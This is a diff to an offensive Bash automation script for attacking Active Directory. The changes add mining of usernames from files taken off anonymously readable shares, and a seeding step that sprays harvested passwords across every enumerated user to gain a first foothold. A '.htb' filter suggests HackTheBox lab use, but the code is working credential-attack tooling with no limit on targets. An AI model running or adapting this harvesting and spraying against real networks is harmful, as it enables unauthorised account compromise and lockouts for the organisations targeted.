@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.36.0"
+readonly VERSION="1.36.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -723,6 +723,18 @@ phase_unauth() {
             sed 's/^/        /' "$_f" 2>/dev/null | head -25 | while IFS= read -r _l; do detail "$_l"; done
         done < <(find "$adl" -type f -size -20k \( -iname '*.txt' -o -iname '*.md' -o -iname '*.csv' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.xml' -o -iname '*.html' -o -iname '*.config' \) 2>/dev/null | head -12)
         harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null)
+        # Usernames live in these files too (the foothold account is NOT known in
+        # advance -- it's whoever the spray flags). Mine candidate usernames from the
+        # content (emails + first.last) so they get merged into users_all.txt and
+        # sprayed, even if RID-brute missed them.
+        { find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null \
+            | grep -ohiE '[a-z][a-z0-9._-]*@[a-z0-9.-]+\.[a-z]{2,}' | sed 's/@.*//'
+          find "$adl" -type f -size -200k ! -name '*.json' -exec cat {} + 2>/dev/null \
+            | grep -ohiE '\b[a-z]{2,}\.[a-z]{2,}\b' \
+            | grep -viE '\.(txt|csv|ini|xml|conf|cnf|html?|md|log|exe|dll|doc|docx|pdf|htb|com|local|net|org|lan|corp)$'
+        } 2>/dev/null | tr 'A-Z' 'a-z' | sort -u >>"$OUTDIR/users_anon.txt"
+        [[ -s "$OUTDIR/users_anon.txt" ]] && { sort -u -o "$OUTDIR/users_anon.txt" "$OUTDIR/users_anon.txt"
+            loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content -> users_anon.txt"; }
     else
         info "No files in anonymously-readable shares"
     fi
@@ -6036,9 +6048,16 @@ main() {
     # Anonymous start with no foothold yet but passwords harvested (e.g. from
     # anonymous shares): spray them across the enumerated users to seed the first
     # identity (incl. must-change accounts → reset) before draining the queue.
-    if [[ ${#CRED_QUEUE[@]} -eq 0 && ${#FOUND_SECRETS[@]} -gt 0 && -s "$OUTDIR/users_all.txt" ]]; then
-        section "SEEDING · spray harvested passwords × enumerated users (no foothold yet)"
-        phase_password_spray
+    if [[ ${#CRED_QUEUE[@]} -eq 0 && ${#FOUND_SECRETS[@]} -gt 0 ]]; then
+        # Rebuild the user list from EVERY source (RID-brute, rpcclient, anon-share
+        # mined names, …) so the spray covers them all — the foothold user is
+        # whichever one the spray flags, not a hard-coded name.
+        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
+        if [[ -s "$OUTDIR/users_all.txt" ]]; then
+            section "SEEDING · spray harvested passwords × enumerated users (no foothold yet)"
+            info "Spraying $(grep -c . "$OUTDIR/users_all.txt") users (RID-brute + rpc + share-mined) with $(echo ${#FOUND_SECRETS[@]}) harvested password(s)"
+            phase_password_spray
+        fi
     fi
     process_queue
 
